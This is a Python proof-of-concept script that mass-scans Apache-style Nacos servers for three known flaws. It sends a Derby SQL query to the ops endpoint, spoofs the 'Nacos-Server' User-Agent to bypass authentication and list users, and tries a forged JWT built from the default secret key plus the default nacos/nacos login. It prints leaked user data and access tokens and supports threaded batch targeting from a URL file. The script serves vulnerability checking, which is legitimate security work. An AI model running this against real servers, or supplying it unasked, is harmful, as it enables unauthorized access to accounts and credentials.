import requests
import argparse
import threading


class NacosPOC:
    def __init__(self, mode=0):
        self.mode = mode
        self.headers = {
            "User-Agent": "Nacos-Server",
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuY"
                             "WNvcyIsImV4cCI6NDA4MTkwNzk5M30.BdQSxmoftt9zePaqO1-B9QFSi1t"
                             "siiQ2mzKUjnZfQJk"
        }
        self.mid_url = ["", "/nacos", "/home/nacos"]

    def _cnvd_2020_67618(self, url):
        """Derby SQL 注入漏洞
        """
        urls = [url + mid + "/v1/cs/ops/derby" for mid in self.mid_url]
        try:
            for furl in urls:
                response = requests.get(furl,
                                        headers=self.headers,
                                        params={"sql": "select * from users"},
                                        timeout=2
                                        )
                if response.status_code == 200 and response.content.find(b'data') != -1:
                    print(f"{url} 存在Derby SQL 注入漏洞：{response.json()}")
                    return
            print(f"{url} 不存在Derby SQL 注入漏洞")
        except requests.exceptions.RequestException as e:
            print(f"{url}请求异常: {e}")

    def _cve_2021_29441(self, url):
        """User-Agent 权限绕过漏洞
        """
        urls = [url + mid + "/v1/auth/users?pageNo=1&pageSize=10" for mid in self.mid_url]
        try:
            for furl in urls:
                response = requests.get(furl,
                                        headers=self.headers,
                                        params={"pageNo": 1, "pageSize": 10},
                                        timeout=2)
                if response.status_code == 200 and response.content.find(b'pageItems') != -1:
                    print(f"{url} 存在User-Agent 权限绕过漏洞：{response.json()}")
                    return
            print(f"{url} 不存在secret.key默认配置漏洞")
        except requests.exceptions.RequestException as e:
            print(f"{url}请求异常: {e}")

    def _qvd_2023_6271(self, url):
        """token.secret.key 默认配置漏洞
        """
        urls = [url + mid + '/v1/auth/users/login' for mid in self.mid_url]

        try:
            for furl in urls:
                response = requests.post(furl,
                                         headers=self.headers,
                                         data={"username": "nacos", "password": "nacos"},
                                         timeout=2)
                if response.status_code == 200 and response.content.find(b'accessToken') != -1:
                    print(f"{url} 存在secret.key默认配置漏洞：{response.json()}")
                    return
            print(f"{url} 不存在secret.key默认配置漏洞")
        except requests.exceptions.RequestException as e:
            print(f"{url}请求异常: {e}")

    def run(self, url):
        if self.mode == 1:
            self._cnvd_2020_67618(url)
        elif self.mode == 2:
            self._cve_2021_29441(url)
        elif self.mode == 3:
            self._qvd_2023_6271(url)
        elif self.mode == 0:
            self._cnvd_2020_67618(url)
            self._cve_2021_29441(url)
            self._qvd_2023_6271(url)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-m',
                        '--mode',
                        type=int,
                        default=0,
                        help='0: all, 1: cnvd202067618, 2: cve202129441, 3: qvd20236271')
    parser.add_argument('-u',
                        '--url',
                        type=str,
                        default=None,
                        help='目标地址，带上http(s)://')
    parser.add_argument('-f',
                        '--file',
                        type=str,
                        default=None,
                        help='批量检测，带上http(s)://')
    args = parser.parse_args()

    poc = NacosPOC(mode=args.mode)
    if args.url:
        poc.run(args.url)

    if args.file:
        # 从url.txt文件中读取URL列表
        with open(args.file, 'r') as f:
            urls = f.read().splitlines()

        threads = []
        for url in urls:
            t = threading.Thread(target=poc.run, args=(url,))
            threads.append(t)
            t.start()

        # 等待所有线程完成
        for t in threads:
            t.join()
